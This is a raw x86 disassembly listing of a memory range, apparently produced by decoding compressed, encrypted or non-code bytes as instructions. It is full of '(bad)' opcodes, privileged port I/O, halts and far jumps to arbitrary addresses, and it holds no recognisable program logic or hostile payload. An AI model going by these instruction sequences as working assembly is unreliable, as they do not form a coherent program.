  42299b:	sub    al,0x9e
  42299d:	in     al,0x9a
  42299f:	(bad)  
  4229a1:	in     eax,dx
  4229a2:	mov    dl,0x0
  4229a4:	cli    
  4229a5:	cwde   
  4229a6:	push   es
  4229a7:	std    
  4229a8:	sti    
  4229a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229aa:	outs   dx,DWORD PTR ds:[esi]
  4229ab:	mov    bh,0x91
  4229ad:	and    ebp,DWORD PTR [ecx+edx*8+0x8]
  4229b1:	cmp    DWORD PTR [ebx+0x7bf0f022],ecx
  4229b7:	out    0x4c,al
  4229b9:	jns    0x4229b8
  4229bb:	push   ecx
  4229bc:	rcl    BYTE PTR [ebx+ecx*1],0x2d
  4229c0:	daa    
  4229c1:	pushf  
  4229c2:	cmp    ah,bh
  4229c4:	sar    DWORD PTR [edi+eax*4-0x3c],0xf4
  4229c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ca:	and    cl,BYTE PTR [ebx+esi*8+0x15]
  4229ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4229cf:	dec    ecx
  4229d0:	jne    0x422a04
  4229d2:	nop
  4229d3:	repz test al,0xa0
  4229d6:	jge    0x422a39
  4229d8:	jl     0x42299f
  4229da:	sbb    ebp,DWORD PTR [ebx]
  4229dc:	cmp    ah,al
  4229de:	ins    BYTE PTR es:[edi],dx
  4229df:	mov    ebp,0x361f06d7
  4229e5:	outs   dx,DWORD PTR ds:[esi]
  4229e6:	hlt    
  4229e7:	push   ss
  4229e8:	in     al,0x21
  4229ea:	cmp    eax,0xf7a8f0ea
  4229ef:	(bad)  
  4229f0:	xchg   ebp,eax
  4229f1:	xor    ch,BYTE PTR [ebp-0x7b]
  4229f4:	xor    edx,DWORD PTR [esi-0x42]
  4229f7:	repz pop ss
  4229f9:	pop    ebp
  4229fa:	bound  eax,QWORD PTR [esi]
  4229fc:	hlt    
  4229fd:	jo     0x4229c7
  4229ff:	je     0x4229ce
  422a01:	fbld   TBYTE PTR [edx+0x6ec11a24]
  422a07:	fwait
  422a08:	test   DWORD PTR [ecx],edx
  422a0a:	(bad)  
  422a0b:	mov    ebp,edx
  422a0d:	loop   0x422a61
  422a0f:	pop    ebp
  422a10:	jnp    0x422a72
  422a12:	and    al,0x57
  422a14:	lods   eax,DWORD PTR ds:[esi]
  422a15:	xlat   BYTE PTR ds:[ebx]
  422a16:	aad    0x50
  422a18:	mov    ecx,0x6d8ee70
  422a1d:	rol    BYTE PTR [eax],1
  422a1f:	dec    ebp
  422a20:	sub    dl,dl
  422a22:	test   BYTE PTR [edx-0x27],bh
  422a25:	mov    edi,0xcc893025
  422a2a:	popa   
  422a2b:	lods   al,BYTE PTR ds:[esi]
  422a2c:	inc    BYTE PTR [edx+0x38]
  422a2f:	arpl   WORD PTR [edi+0x5a975de1],bx
  422a35:	enter  0x72f8,0x88
  422a39:	pop    ebp
  422a3a:	sbb    eax,0x1e92138b
  422a3f:	retf   0xa042
  422a42:	and    DWORD PTR [eax+esi*1+0x24],ecx
  422a46:	test   al,0x55
  422a48:	call   0x9660:0x7c2152f0
  422a4f:	mov    ch,0xfa
  422a51:	adc    esi,DWORD PTR [ecx]
  422a53:	lea    ebx,[edi+edx*2-0x67]
  422a57:	mov    bh,0x83
  422a59:	xor    eax,0x8133e769
  422a5e:	outs   dx,DWORD PTR ds:[esi]
  422a5f:	mov    dl,0x2a
  422a61:	imul   ecx,DWORD PTR [ebx+0x5f],0xffffff99
  422a65:	popf   
  422a66:	pop    es
  422a67:	daa    
  422a68:	dec    ecx
  422a69:	pusha  
  422a6a:	loopne 0x422a91
  422a6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6d:	cwde   
  422a6e:	cwde   
  422a6f:	xchg   BYTE PTR [ecx-0x78949914],al
  422a75:	mov    eax,0x5256d1fe
  422a7a:	es xchg ebp,eax
  422a7c:	mov    ecx,0xda00019c
  422a81:	xchg   esp,eax
  422a82:	shl    DWORD PTR [esi+0x1f],cl
  422a85:	fisttp WORD PTR [eax+0x4e]
  422a88:	ja     0x422a8b
  422a8a:	or     cl,ch
  422a8c:	mov    ds:0x96a46621,eax
  422a91:	cli    
  422a92:	xchg   edi,eax
  422a93:	jne    0x422a8b
  422a95:	int    0xa3
  422a97:	mov    edi,0x1e78dfb9
  422a9c:	bnd ja 0x422af2
  422a9f:	popf   
  422aa0:	sbb    esi,esi
  422aa2:	push   ss
  422aa3:	pop    ds
  422aa4:	fwait
  422aa5:	cmp    bl,BYTE PTR [edx-0x7]
  422aa8:	into   
  422aa9:	mov    ebp,0xa52a193
  422aae:	xor    BYTE PTR [ebp+0x506a7618],bh
  422ab4:	hlt    
  422ab5:	push   esi
  422ab6:	cld    
  422ab7:	pop    ecx
  422ab8:	and    al,0x9b
  422aba:	mov    ebx,0x6e4a61c0
  422abf:	sar    dh,0x0
  422ac2:	fld    QWORD PTR [ebx-0x50]
  422ac5:	ret    0x5da7
  422ac8:	je     0x422b3f
  422aca:	push   esp
  422acb:	in     eax,0xa0
  422acd:	or     ebp,DWORD PTR [edx-0x4d02bd8a]
  422ad3:	arpl   WORD PTR [ebx+0x2],bx
  422ad6:	jmp    0x49cfa35f
  422adb:	ja     0x422ac2
  422add:	mov    ecx,0x21ee83bd
  422ae2:	or     eax,0xcfe12357
  422ae7:	pop    edx
  422ae8:	pop    esp
  422ae9:	mov    ch,0xa7
  422aeb:	mov    ah,0x53
  422aed:	mov    dh,ah
  422aef:	xor    al,0x4d
  422af1:	mov    dl,0xdd
  422af3:	repz jle 0x422a83
  422af6:	les    esp,FWORD PTR [eax-0x3a]
  422af9:	mov    BYTE PTR [ebx+ecx*1-0x26],al
  422afd:	sub    DWORD PTR ds:0x4dd1a63,0xaa60d7a7
  422b07:	jmp    esi
  422b09:	xchg   esi,eax
  422b0a:	bnd jnp 0x422b76
  422b0d:	jne    0x422b2c
  422b0f:	outs   dx,BYTE PTR ds:[esi]
  422b10:	mov    eax,0x8c0fbcde
  422b15:	retf   0x3a4f
  422b18:	dec    ebx
  422b19:	inc    esp
  422b1a:	imul   edx,DWORD PTR [ebx],0x79013098
  422b20:	pop    ecx
  422b21:	stos   BYTE PTR es:[edi],al
  422b22:	xchg   cx,ax
  422b24:	jbe    0x422b2b
  422b26:	xor    eax,0xc155c49
  422b2b:	cs sub al,bl
  422b2e:	pop    ebp
  422b2f:	xchg   ecx,eax
  422b30:	pop    ss
  422b31:	pop    ds
  422b32:	adc    bl,BYTE PTR [ecx]
  422b34:	jge    0x422ac8
  422b36:	or     bh,BYTE PTR [ecx-0x3c]
  422b39:	jmp    0xde1:0x5530bd78
  422b40:	imul   ecx,ebp,0x15
  422b43:	mov    eax,0x5e089ef5
  422b48:	cli    
  422b49:	loop   0x422aeb
  422b4b:	sbb    eax,0x94a1502b
  422b50:	aad    0xea
  422b52:	mov    esi,0x31d2c646
  422b57:	xor    eax,DWORD PTR [ecx-0x4ddfd8c0]
  422b5d:	mov    ebx,0xbe0d5c56
  422b62:	and    eax,DWORD PTR [esp+esi*2+0x37ba427b]
  422b69:	inc    esi
  422b6a:	mov    ds:0x43fd88b3,al
  422b6f:	pop    eax
  422b70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b71:	call   0xdae1:0x4baa273f
  422b78:	push   esi
  422b79:	test   DWORD PTR [ebx+0x19],0xc85d088b
  422b80:	pushf  
  422b81:	mov    WORD PTR [ebp+0x18],?
  422b84:	mov    ecx,0xf0b40090
  422b89:	cs (bad) 
  422b8b:	lahf   
  422b8c:	inc    ebx
  422b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b8e:	fsubrp st(1),st
  422b90:	test   BYTE PTR ss:[edi-0x2c],al
  422b94:	lock shr DWORD PTR [edx],0xf8
  422b98:	imul   ecx,edx,0xb843661f
  422b9e:	test   DWORD PTR [ebx*2+0xb6e4d84],ebx
  422ba5:	push   eax
  422ba6:	scas   eax,DWORD PTR es:[edi]
  422ba7:	ins    DWORD PTR es:[edi],dx
  422ba8:	cwde   
  422ba9:	test   BYTE PTR [edi-0x5d8e6e6f],bl
  422baf:	(bad)  
  422bb0:	or     ebx,DWORD PTR [ebx+edx*1-0x4a]
  422bb4:	sar    DWORD PTR [edx],1
  422bb6:	icebp  
  422bb7:	div    BYTE PTR [ecx-0x3c]
  422bba:	ins    BYTE PTR es:[edi],dx
  422bbb:	fidiv  WORD PTR [esi+edi*4-0x3d14219b]
  422bc2:	int3   
  422bc3:	mov    cl,0x38
  422bc5:	inc    ebp
  422bc6:	pop    edi
  422bc7:	sub    ebx,DWORD PTR [ecx]
  422bc9:	mov    bh,0x75
  422bcb:	nop
  422bcc:	int    0xd7
  422bce:	adc    BYTE PTR [eax],0xcf
  422bd1:	aas    
  422bd2:	dec    ebx
  422bd3:	jnp    0x422c4d
  422bd5:	and    DWORD PTR [edi],edi
  422bd7:	inc    edi
  422bd8:	loop   0x422bd3
  422bda:	in     al,0x80
  422bdc:	fisttp QWORD PTR [ebx+ecx*8]
  422bdf:	int    0x91
  422be1:	test   edi,eax
  422be3:	iret   
  422be4:	inc    eax
  422be5:	or     bl,BYTE PTR [ebp-0x6c]
  422be8:	mov    edx,0xe9fc556f
  422bed:	sub    cl,BYTE PTR [eiz*8-0x721d1775]
  422bf4:	xor    BYTE PTR [eax],dh
  422bf6:	xchg   esp,eax
  422bf7:	inc    ecx
  422bf8:	inc    ecx
  422bf9:	add    DWORD PTR [eax+0x22],ebp
  422bfc:	test   BYTE PTR [edi],0x28
  422bff:	sbb    bh,BYTE PTR [esi+0x31]
  422c02:	xlat   BYTE PTR ds:[ebx]
  422c03:	push   0x35
  422c05:	stos   BYTE PTR es:[edi],al
  422c06:	lods   al,BYTE PTR ds:[esi]
  422c07:	pop    esp
  422c08:	and    al,0x5
  422c0a:	fcmovnbe st,st(0)
  422c0c:	aaa    
  422c0d:	mov    ebp,0xd81044ad
  422c12:	cmp    eax,0xfc4377a
  422c17:	fidivr WORD PTR [eax+0x4948d69c]
  422c1d:	out    0x90,ax
  422c20:	fstp   DWORD PTR [edi]
  422c22:	xor    al,0x8d
  422c24:	sbb    al,0xc8
  422c26:	cmp    DWORD PTR [ecx],ebp
  422c28:	xor    esp,ebp
  422c2a:	xchg   DWORD PTR [ecx+0x1],edi
  422c2d:	mov    bh,0x73
  422c2f:	repnz cmp BYTE PTR [esp+ecx*2-0x56ca7dc7],0xb8
  422c38:	aad    0x19
  422c3a:	mov    bl,0x6d
  422c3c:	sbb    ebx,eax
  422c3e:	dec    esi
  422c3f:	mov    ss,WORD PTR [ecx-0x2f]
  422c42:	xchg   BYTE PTR [edi+0x6964eaff],al
  422c48:	inc    edx
  422c49:	iret   
  422c4a:	inc    edi
  422c4b:	aam    0xc8
  422c4d:	stos   BYTE PTR es:[edi],al
  422c4e:	push   cs
  422c4f:	xchg   ebp,eax
  422c50:	(bad)  
  422c51:	imul   BYTE PTR [edx+ecx*2-0x33]
  422c55:	jecxz  0x422c01
  422c57:	mov    ch,0xc6
  422c59:	fcmovnu st,st(1)
  422c5b:	popf   
  422c5c:	fwait
  422c5d:	enter  0x233f,0x63
  422c61:	adc    BYTE PTR [ebx],dl
  422c63:	add    BYTE PTR [eax-0x1a76c530],cl
  422c69:	cmp    al,0xda
  422c6c:	dec    ebp
  422c6d:	jge    0x422c68
  422c6f:	lods   eax,DWORD PTR ds:[esi]
  422c70:	pop    edi
  422c71:	and    eax,0xc1a21762
  422c76:	int    0x85
  422c78:	ins    BYTE PTR es:[edi],dx
  422c79:	pop    ds
  422c7a:	and    BYTE PTR [ecx],ah
  422c7c:	in     al,0xdb
  422c7e:	ret    0x49af
  422c81:	inc    esp
  422c82:	hlt    
  422c83:	arpl   WORD PTR [edx-0x6d1207dc],cx
  422c89:	add    edi,DWORD PTR [ecx+0x16]
  422c8c:	jnp    0x422cbe
  422c8e:	pop    esp
  422c8f:	(bad)  
  422c90:	stos   DWORD PTR es:[edi],eax
  422c91:	inc    edi
  422c92:	pop    eax
  422c93:	pop    ds
  422c94:	mov    eax,ds:0x45618ed2
  422c9a:	ds mov esp,0x86a2c129
  422ca0:	fs pop edx
  422ca2:	ror    bh,cl
  422ca4:	in     al,dx
  422ca5:	jbe    0x422cc4
  422ca7:	pop    edx
  422ca8:	adc    DWORD PTR [edi+ebp*8-0x7b50c7c],0x65bd216e
  422cb3:	ficomp DWORD PTR [ebx+0xe]
  422cb6:	sti    
  422cb7:	adc    DWORD PTR [esi+0x4356f1c1],ebx
  422cbd:	cs ret 0xc3b5
  422cc1:	add    BYTE PTR [esi-0x7ea98e21],ch
  422cc7:	pop    ss
  422cc8:	add    eax,0xb5ce894f
  422ccd:	out    dx,eax
  422cce:	jo     0x422c7e
  422cd0:	jb     0x422ca9
  422cd2:	xchg   BYTE PTR [edx+esi*4],dl
  422cd5:	xchg   DWORD PTR [esi],ebp
  422cd7:	add    edi,edi
  422cd9:	adc    al,0x24
  422cdb:	push   ebx
  422cdc:	add    al,0xe8
  422cde:	jl     0x422c68
  422ce0:	retf   0xee38
  422ce3:	cmc    
  422ce4:	xor    BYTE PTR [edx+0x78],al
  422ce7:	hlt    
  422ce8:	or     dh,BYTE PTR [ebx-0x4]
  422ceb:	or     BYTE PTR [eax+0x34909027],cl
  422cf1:	js     0x422c87
  422cf3:	and    dl,ah
  422cf5:	pop    ds
  422cf6:	adc    BYTE PTR [esp+ebx*2],ah
  422cf9:	jmp    0x422c84
  422cfb:	mov    dl,0xf3
  422cfd:	xor    eax,0x815b8408
  422d02:	leave  
  422d03:	mov    cl,0x9c
  422d05:	loopne 0x422cf5
  422d07:	div    BYTE PTR [ecx+0x21]
  422d0a:	dec    ecx
  422d0b:	sbb    eax,0x2b5e2ce
  422d10:	sub    esp,DWORD PTR [ecx-0x80]
  422d13:	gs out dx,eax
  422d15:	mov    eax,0xcc9ce83e
  422d1a:	ins    DWORD PTR es:[edi],dx
  422d1b:	mov    eax,DWORD PTR [esp+edi*4-0x41]
  422d1f:	stos   BYTE PTR es:[edi],al
  422d20:	mov    ebp,0xc8d1c3df
  422d25:	and    dh,BYTE PTR [ebp-0x5d96015f]
  422d2b:	mov    esp,0xfcea65aa
  422d30:	add    DWORD PTR [edi-0x1],ecx
  422d33:	rcr    BYTE PTR [ebx+0x30],0x68
  422d37:	add    BYTE PTR [ebx+0x4d],dh
  422d3a:	xchg   esi,eax
  422d3b:	jne    0x422d86
  422d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d3e:	jl     0x422d4d
  422d40:	lahf   
  422d41:	jns    0x422d57
  422d43:	mov    eax,ds:0x891b053
  422d48:	cmp    eax,0xc1c34940
  422d4d:	add    DWORD PTR cs:[esi],ecx
  422d50:	jg     0x422ce1
  422d52:	das    
  422d53:	outs   dx,BYTE PTR ds:[esi]
  422d54:	xor    al,0x35
  422d56:	jae    0x422da1
  422d58:	pop    edx
  422d59:	xor    BYTE PTR [ecx-0x12],ch
  422d5c:	add    dl,BYTE PTR [esi-0x68]
  422d5f:	jg     0x422d64
  422d61:	retf   0x9173
  422d64:	push   esi
  422d65:	add    eax,0x65beca8c
  422d6a:	dec    ecx
  422d6b:	or     DWORD PTR [edi-0x14],0xd67b0afc
  422d72:	sbb    BYTE PTR [eax+eiz*1+0x51f4ee7b],bl
  422d79:	jge    0x422d5e
  422d7b:	in     eax,0x49
  422d7d:	test   DWORD PTR [ecx+edx*8],eax
  422d80:	out    0xc9,al
  422d82:	mov    ecx,0x393da391
  422d87:	mov    dh,0x78
  422d89:	fld    QWORD PTR ds:0x34845a28
  422d8f:	jmp    0x650dac5e
  422d94:	or     edx,edx
  422d96:	cmp    ecx,edi
  422d98:	xchg   DWORD PTR [ebx],ebx
  422d9a:	inc    ecx
  422d9b:	xbegin 0x5faefa29
  422da1:	sbb    eax,0x8fa79cd8
  422da6:	sbb    eax,0x9021bd6a
  422dab:	ja     0x422ddc
  422dad:	sub    BYTE PTR [eax-0x48a4f9e5],0x36
  422db4:	sbb    al,BYTE PTR [ebp+ecx*8-0x7f]
  422db8:	frstor [ebp+eiz*8-0x72]
  422dbc:	(bad)  
  422dbd:	(bad)  
  422dbe:	fisub  DWORD PTR [esi]
  422dc0:	fcom   QWORD PTR [edi-0x6979cc67]
  422dc6:	(bad)  
  422dc8:	jbe    0x422e17
  422dca:	mov    ds:0x2149a3fe,eax
  422dcf:	dec    edx
  422dd0:	mov    edx,DWORD PTR [edi+0x7ab47b64]
  422dd6:	idiv   DWORD PTR [esi+0x3b]
  422dd9:	sbb    bh,cl
  422ddb:	(bad)  
  422ddc:	repz loope 0x422e20
  422ddf:	ds cmp ebx,edi
  422de2:	or     al,0xa0
  422de4:	pop    ecx
  422de5:	out    0xbd,al
  422de7:	jbe    0x422e23
  422de9:	cmp    ebx,DWORD PTR [edi]
  422deb:	xchg   esp,eax
  422dec:	mov    cl,0xcf
  422dee:	xchg   DWORD PTR [ecx-0x62f3fe1],esp
  422df4:	adc    edx,ecx
  422df6:	inc    esi
  422df7:	fnstsw ax
  422df9:	lods   eax,DWORD PTR ds:[esi]
  422dfa:	jmp    DWORD PTR [eax-0x27]
  422dfd:	dec    edi
  422dfe:	fisub  DWORD PTR [ecx+0x3a]
  422e01:	nop
  422e02:	aam    0xf4
  422e04:	or     DWORD PTR [eax-0x35272afe],ebp
  422e0a:	imul   ebx,DWORD PTR [esi],0x5044beed
  422e10:	out    dx,eax
  422e11:	jg     0x422d94
  422e13:	das    
  422e14:	mov    WORD PTR [ecx],gs
  422e16:	cmp    ebp,eax
  422e18:	xor    eax,DWORD PTR [eax+esi*1+0x4ae480cf]
  422e1f:	dec    ebp
  422e20:	imul   ecx,DWORD PTR [esi+0x31],0x4e9875d
  422e27:	jne    0x422e6d
  422e29:	jl     0x422dd2
  422e2b:	rcl    BYTE PTR [esi],1
  422e2d:	outs   dx,DWORD PTR ds:[esi]
  422e2e:	ins    DWORD PTR es:[edi],dx
  422e2f:	inc    esp
  422e30:	sbb    ah,0x6f
  422e33:	mov    dl,0xd6
  422e35:	push   0x353a37f2
  422e3a:	pop    ebx
  422e3b:	jae    0x422eb3
  422e3d:	inc    edx
  422e3e:	xchg   esi,eax
  422e3f:	inc    edx
  422e40:	push   ebx
  422e41:	enter  0xb32,0xbc
  422e45:	adc    ah,BYTE PTR [esi]
  422e47:	adc    al,0x47
  422e49:	push   ebp
  422e4a:	js     0x422dcf
  422e4c:	daa    
  422e4d:	gs cmp dl,ah
  422e50:	lods   al,BYTE PTR ds:[esi]
  422e51:	pop    eax
  422e52:	loopne 0x422e0a
  422e54:	xor    BYTE PTR [ebx],cl
  422e56:	or     esp,DWORD PTR [esp+edx*1-0x75]
  422e5a:	not    BYTE PTR [ebp-0x5e2829b0]
  422e60:	jo     0x422e65
  422e62:	jl     0x422e99
  422e64:	xchg   esp,eax
  422e65:	jecxz  0x422e2e
  422e67:	shl    BYTE PTR [edx-0x595cdaa5],1
  422e6d:	into   
  422e6e:	jp     0x6f0026d0
  422e74:	rol    DWORD PTR [eax+0x38],0x5c
  422e78:	leave  
  422e79:	mov    ebx,0xa8d2a81d
  422e7e:	cs jno 0x422e90
  422e81:	cmp    DWORD PTR [ebx-0x41d814eb],esp
  422e87:	test   DWORD PTR [ebp+0x11],edi
  422e8a:	or     BYTE PTR ds:[ecx+0x4efff95c],bh
  422e91:	lock es xchg ebp,eax
  422e94:	adc    DWORD PTR [eax+0x617cc184],0xccae1aea
  422e9e:	cmp    al,0x3c
  422ea0:	and    al,0xd5
  422ea2:	cmp    al,0x72
  422ea4:	inc    esi
  422ea5:	cmp    cl,BYTE PTR [esi-0x36]
  422ea8:	dec    eax
  422ea9:	or     DWORD PTR [esi+0x48b561b0],0xffffffeb
  422eb0:	or     dh,ch
  422eb2:	push   esp
  422eb3:	sub    eax,0x7f9eb3e5
  422eb8:	xchg   bl,dl
  422eba:	(bad)  
  422ebb:	xlat   BYTE PTR ds:[ebx]
  422ebc:	jno    0x422f3c
  422ebe:	lock mov ch,0xa1
  422ec1:	mov    eax,ds:0x8d009232
  422ec6:	fstp   DWORD PTR ds:0x2066cb65
  422ecc:	inc    ebx
  422ecd:	add    DWORD PTR [ebp+0x66],esp
  422ed0:	add    eax,0x608aefd4
  422ed5:	adc    BYTE PTR [edx-0x2659354a],bl
  422edb:	sahf   
  422edc:	push   ds
  422edd:	dec    ecx
  422ede:	test   eax,0x49f9a9d9
  422ee3:	jno    0x422ec7
  422ee5:	fsub   DWORD PTR [ebx+0x42]
  422ee8:	(bad)  
  422ee9:	in     eax,0x65
  422eeb:	jo     0x422ed3
  422eed:	ins    BYTE PTR es:[edi],dx
  422eee:	push   ds
  422eef:	dec    ebx
  422ef0:	and    dl,BYTE PTR [ebp+0x664ea2f5]
  422ef6:	mov    al,0x9
  422ef8:	(bad)  
  422ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422efa:	enter  0x899,0xfe
  422efe:	xchg   edi,eax
  422eff:	sub    eax,0x1a8b718e
  422f04:	pop    eax
  422f05:	mov    ebx,0x5eb7ab4f
  422f0a:	xlat   BYTE PTR ds:[ebx]
  422f0b:	xchg   edx,eax
  422f0c:	pop    ss
  422f0d:	int3   
  422f0e:	sbb    eax,0x1630a991
  422f13:	ins    DWORD PTR es:[edi],dx
  422f14:	pop    edi
  422f15:	mov    ebx,0x5782d5ca
  422f1a:	pop    ds
  422f1b:	xchg   ebp,eax
  422f1c:	dec    eax
  422f1d:	nop
  422f1e:	push   edx
  422f1f:	cmp    eax,0xcb6af436
  422f24:	or     ebx,DWORD PTR [eax+edi*8-0x3c]
  422f28:	push   ds
  422f29:	adc    al,0xb5
  422f2b:	jae    0x1de7dab1
  422f31:	push   cs
  422f32:	out    0x6a,eax
  422f34:	xor    esi,DWORD PTR [ecx]
  422f36:	dec    ecx
  422f37:	dec    esp
  422f38:	in     eax,0x5
  422f3a:	addr16 in al,0xb
  422f3d:	data16 aad 0xd6
  422f40:	push   eax
  422f41:	or     DWORD PTR [edx+0x48b980f4],esp
  422f47:	int3   
  422f48:	stos   BYTE PTR es:[edi],al
  422f49:	dec    edx
  422f4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f4b:	xchg   ebp,eax
  422f4c:	xor    DWORD PTR [ebp+0x8],edx
  422f4f:	cli    
  422f50:	mov    al,ds:0x204de093
  422f55:	mov    ah,BYTE PTR [eax-0x20]
  422f58:	dec    eax
  422f59:	rol    BYTE PTR [eax-0x50],cl
  422f5c:	jae    0x422f62
  422f5e:	jmp    0x422fb5
  422f60:	bound  esi,QWORD PTR [edx-0x30]
  422f63:	sbb    eax,0x8e341661
  422f68:	dec    edi
  422f69:	xchg   esp,eax
  422f6a:	cld    
  422f6b:	hlt    
  422f6c:	into   
  422f6d:	mov    ds:0x4682e953,eax
  422f72:	dec    ebp
  422f73:	inc    esi
  422f74:	xchg   edx,eax
  422f75:	loop   0x422f5e
  422f77:	dec    ebx
  422f78:	pop    ebp
  422f79:	iret   
  422f7a:	add    al,0x36
  422f7c:	imul   esp,DWORD PTR [ecx-0x10],0x200a2df9
  422f83:	out    dx,eax
  422f84:	sub    bl,BYTE PTR [eax]
  422f86:	or     al,ah
  422f88:	sub    al,0xa5
  422f8a:	je     0x422f81
  422f8c:	bound  edi,QWORD PTR [ebp+0x78a111e6]
  422f92:	xor    DWORD PTR [edi],eax
  422f94:	inc    bh
  422f96:	or     eax,0x413a144f
  422f9b:	jae    0x422f9c
  422f9d:	das    
  422f9e:	push   ecx
  422f9f:	jecxz  0x422f24
  422fa1:	iret   
  422fa2:	dec    edi
  422fa3:	xchg   ecx,eax
  422fa4:	jg     0x422fd6
  422fa6:	fucomi st,st(5)
  422fa8:	xor    eax,edx
  422faa:	(bad)  
  422fab:	xor    al,0x1e
  422fad:	ret    0x43c8
  422fb0:	jge    0x422f32
  422fb2:	mov    cl,0x90
  422fb4:	xor    al,0x17
  422fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fb7:	test   DWORD PTR [edi],ebx
  422fb9:	mov    DWORD PTR [ebp-0x60],ebx
  422fbc:	je     0x422f5a
  422fbe:	fld    DWORD PTR [edi-0x70]
  422fc1:	aad    0x86
  422fc3:	jnp    0x422f84
  422fc5:	push   esi
  422fc6:	mov    ebx,0x4cf733df
  422fcb:	(bad)  
  422fcc:	in     eax,0xc1
  422fce:	scas   eax,DWORD PTR es:[edi]
  422fcf:	jns    0x42303c
  422fd1:	cmp    DWORD PTR [edx+0x28],esi
  422fd4:	pop    eax
  422fd5:	sbb    al,0x3b
  422fd7:	outs   dx,BYTE PTR ds:[esi]
  422fd8:	add    eax,0xd6b72f0d
  422fdd:	push   0xf56472f8
  422fe2:	sub    al,0x2c
  422fe4:	add    BYTE PTR [eax],al
  422fe6:	add    BYTE PTR [eax],al
  422fe8:	add    BYTE PTR [eax],al
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422fb1
  422ff7:	pop    ss
  422ff8:	in     eax,dx
  422ff9:	call   0x682:0x1be64
  423000:	add    BYTE PTR [eax],al
  423002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423003:	inc    esp
  423004:	retf   
  423005:	jo     0x423068
  423007:	dec    eax
  423008:	rcl    BYTE PTR [esi],1
  42300a:	aas    
  42300b:	mov    ch,BYTE PTR [ebp+0x20]
  42300e:	pusha  
  42300f:	push   ds
  423010:	(bad)  
  423011:	js     0x423030
  423013:	or     bh,BYTE PTR ds:0x492b402c
  423019:	xor    eax,0x700eda70
  42301e:	jno    0x423049
  423020:	int    0x68
  423022:	xchg   esi,eax
  423023:	cli    
  423024:	xor    al,0x68
  423026:	inc    eax
  423027:	jae    0x422fcd
  423029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42302a:	mov    esi,0xf50649ce
  42302f:	xchg   edi,eax
  423030:	sbb    eax,0x197e0b83
  423035:	rcl    DWORD PTR [bx+di+0x40],cl
  423039:	mov    ebp,0x5a28a894
  42303e:	ret    0x498f
  423041:	add    ch,cl
  423043:	iret   
  423044:	fmul   st,st(3)
  423046:	(bad)  
  423047:	or     esi,DWORD PTR [edx+0x5ca5bd72]
  42304d:	addr16 mov esi,0xcbcd67d9
  423053:	mov    cl,0x3c
  423055:	fisub  DWORD PTR [esi-0x736efdef]
  42305b:	icebp  
  42305c:	mov    edi,0xd281920a
  423061:	mov    WORD PTR [eax-0x74],cs
  423064:	mov    al,ds:0xf3b15902
  423069:	inc    edi
  42306a:	adc    cl,bl
  42306c:	idiv   bh
  42306e:	inc    esi
  42306f:	add    al,0x8c
  423071:	scas   eax,DWORD PTR es:[edi]
  423072:	aaa    
  423073:	push   edi
  423074:	adc    al,0x53
  423076:	inc    edi
  423077:	jecxz  0x4230a3
  423079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42307a:	add    ch,cl
  42307c:	fsubrp st(5),st
  42307e:	dec    esi
  42307f:	mov    dl,0x14
  423081:	mov    ah,0xad
  423083:	and    ch,BYTE PTR [edi]
  423085:	rol    BYTE PTR [ebx-0x309e23ad],1
  42308b:	add    ebx,0x17
  42308e:	adc    edi,ebp
  423090:	dec    eax
  423091:	mov    ds:0xebecd660,eax
  423096:	cmp    al,0x26
  423098:	(bad)  
  423099:	xor    al,0x32
  42309b:	mov    ch,0x68
  42309d:	repz pop es
  42309f:	jno    0x423035
  4230a1:	call   0xdbdc268b
  4230a6:	inc    ebx
  4230a7:	jp     0x4230ab
  4230a9:	jmp    esi
  4230ab:	or     dl,BYTE PTR [edx+0x1b310366]
  4230b1:	(bad)  
  4230b2:	pop    eax
  4230b3:	cmc    
  4230b4:	iret   
  4230b5:	(bad)  
  4230b6:	in     eax,dx
  4230b7:	out    0x95,al
  4230b9:	rcl    BYTE PTR [ecx-0x239b793f],1
  4230bf:	fisttp WORD PTR [ecx+esi*2-0x55f4161f]
  4230c6:	loope  0x42304d
  4230c8:	loop   0x4230e4
  4230ca:	enter  0x75a0,0x35
  4230ce:	cmp    al,dh
  4230d0:	inc    eax
  4230d1:	cld    
  4230d2:	lahf   
  4230d3:	out    dx,al
  4230d4:	shl    DWORD PTR [ebx],1
  4230d6:	xor    al,0xb2
  4230d8:	dec    edi
  4230d9:	pop    edx
  4230da:	xchg   ebx,eax
  4230db:	push   edx
  4230dc:	in     al,dx
  4230dd:	repz pop esi
  4230df:	mov    cl,0xac
  4230e1:	cdq    
  4230e2:	mov    ds:0x45026798,eax
  4230e7:	fidivr DWORD PTR [ecx-0x1bedc7a7]
  4230ed:	repnz and al,0x4a
  4230f0:	out    dx,al
  4230f1:	pusha  
  4230f2:	jns    0x42312b
  4230f4:	in     eax,dx
  4230f5:	jmp    0x423128
  4230f7:	mov    esi,ebx
  4230f9:	adc    eax,0x28928c39
  4230fe:	je     0x4230fb
  423100:	push   0xcc522a2b
  423105:	jecxz  0x4230de
  423107:	mov    ch,BYTE PTR [ecx-0x22]
  42310a:	inc    ecx
  42310b:	jb     0x423149
  42310d:	sar    DWORD PTR [ecx-0x69],1
  423110:	cmp    al,0xc8
  423112:	aam    0x6c
  423114:	cmp    cl,ah
  423116:	(bad)  
  423117:	repnz xchg esp,eax
  423119:	dec    ebp
  42311a:	or     DWORD PTR [ebx],edx
  42311c:	ins    DWORD PTR es:[edi],dx
  42311d:	pop    edx
  42311e:	and    al,0xaf
  423120:	cmp    al,0x30
  423122:	std    
